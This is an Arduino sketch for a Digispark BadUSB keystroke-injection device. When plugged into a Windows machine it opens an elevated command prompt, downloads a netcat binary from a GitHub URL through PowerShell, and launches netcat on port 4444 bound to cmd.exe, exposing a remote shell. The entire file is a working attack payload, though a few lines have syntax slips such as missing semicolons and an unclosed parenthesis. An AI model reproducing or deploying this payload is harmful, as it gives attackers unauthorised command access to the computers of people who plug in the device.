#include "DigiKeyboard.h"

void setup() {
  // don't need to set anything up to use DigiKeyboard
}


void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("cmd"));
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(1000);
  // Launched administrative prompt
  DigiKeyboard.sendln("cd %TEMP%")
  DigiKeyboard.sendln("powershell (new-object System.Net.WebClient).DownloadFile('https://github.com/ThessSec/writeups/raw/master/digispark_badusb_files/rev_shell/netcat-1.11/nc64.exe','nc.exe'")
  DigiKeyboard.sendln("nc -lp 4444 -vv -e cmd.exe -L") 
  for(; ; );
}
